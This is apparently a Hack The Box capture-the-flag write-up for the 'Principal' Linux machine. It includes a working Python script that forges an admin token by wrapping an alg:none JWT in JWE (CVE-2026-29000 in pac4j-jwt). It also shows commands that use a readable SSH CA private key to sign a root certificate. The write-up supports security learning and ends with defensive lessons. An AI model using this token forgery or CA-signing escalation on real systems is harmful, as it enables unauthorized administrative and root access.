# HTB: Principal — Writeup

**Difficulty:** Medium
**OS:** Linux
**IP:** `$IP`

---


Principal is a medium-difficulty Linux machine hosting an internal web platform. The attack chain involves:
1. Discovering a public JWKS endpoint
2. Exploiting **CVE-2026-29000** (pac4j-jwt authentication bypass) to forge an admin JWT
3. Extracting SSH CA credentials from the admin API
4. Using the SSH Certificate Authority private key to sign a root certificate and escalate privileges

---

## Reconnaissance

```bash
nmap -sC -sV -p- $IP
```

Port 8080 is open running an embedded Jetty server.

```bash
ffuf -u http://$IP:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

`/dashboard` is discovered. Navigating to it briefly renders the page before redirecting to `/login`. Intercepting with Burp Suite and dropping the redirect reveals the dashboard HTML.

---

## Web Enumeration

Fetching `/static/js/app.js` reveals the client application logic:

- Authentication uses **JWE (RSA-OAEP-256 + A128GCM)** wrapping an inner **RS256-signed JWT**
- The JWKS public key endpoint `/api/auth/jwks` is **unauthenticated**
- Admin-only endpoints: `/api/users`, `/api/settings`
- Response header: `X-Powered-By: pac4j-jwt/6.0.3`

---

## CVE-2026-29000 — pac4j-jwt Authentication Bypass

pac4j-jwt version 6.0.3 is vulnerable to an authentication bypass. When a JWE token wraps an unsigned **PlainJWT** (`alg: none`), the `JwtAuthenticator` component skips signature verification due to a null check logic error, accepting arbitrary claims as valid.

**Step 1 — Fetch the RSA public key:**
```bash
curl http://$IP:8080/api/auth/jwks
```

**Step 2 — Forge an admin token:**

```python
from jwcrypto import jwk, jwe
import json, time, base64

key_data = {
    "kty": "RSA", "e": "AQAB", "kid": "enc-key-1",
    "n": "<n_value_from_jwks>"
}
pub_key = jwk.JWK(**key_data)

claims = {
    "sub": "admin", "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

# Build unsigned PlainJWT
h = base64.urlsafe_b64encode(b'{"alg":"none"}').rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b'=').decode()
plain_jwt = f"{h}.{p}."

# Wrap in JWE using server's public key
protected = {"alg": "RSA-OAEP-256", "enc": "A128GCM", "kid": "enc-key-1"}
token = jwe.JWE(plain_jwt.encode(), json.dumps(protected))
token.add_recipient(pub_key)
print(token.serialize(compact=True))
```

**Step 3 — Access admin endpoints:**

```bash
TOKEN="<forged_token>"

curl -s http://$IP:8080/api/users \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

curl -s http://$IP:8080/api/settings \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

---

## Foothold — SSH Access

`/api/settings` reveals:

```json
"encryptionKey": "D3pl0y_$$H_Now42!",
"sshCaPath": "/opt/principal/ssh/",
"sshCertAuth": "enabled"
```

Using the password to SSH in as `svc-deploy`:

```bash
ssh svc-deploy@$IP
# Password: D3pl0y_$$H_Now42!
```

**User flag:**
```bash
cat ~/user.txt
```

---

## Privilege Escalation — SSH Certificate Authority

Checking group membership:

```bash
id
# uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

The `deployers` group has read access to `/opt/principal/ssh/`, which contains the SSH CA private key (`ca`).

The sshd configuration trusts this CA for certificate-based authentication — meaning any certificate signed by this CA will be accepted without a password.

```bash
# Copy the CA private key
cat /opt/principal/ssh/ca > ca_key
chmod 600 ca_key

# Generate a new keypair
ssh-keygen -f mykey -N ""

# Sign the public key as root using the CA
ssh-keygen -s ca_key -I root-cert -n root mykey.pub
# Produces: mykey-cert.pub

# SSH as root using the signed certificate
ssh -i mykey root@localhost
```

**Root flag:**
```bash
cat /root/root.txt
```

---

## Attack Chain

```
/api/auth/jwks (unauthenticated)
        │
        ▼
CVE-2026-29000: JWE-wrapped PlainJWT bypasses signature verification
        │
        ▼
ROLE_ADMIN token → /api/settings leaks SSH CA path + credentials
        │
        ▼
SSH login as svc-deploy (deployers group)
        │
        ▼
Read CA private key → sign root SSH certificate
        │
        ▼
root@principal
```

---

## Key Takeaways

- **Never expose JWKS endpoints without rate limiting** — public key retrieval is the first step of this exploit
- **JWE encryption ≠ authentication** — encrypted tokens must still have their inner signature verified
- **SSH CA private keys** must be strictly permission-controlled; read access to any member of a group is sufficient for full compromise
- **Credentials in API responses** (`/api/settings`) should never be returned to clients, even admin ones
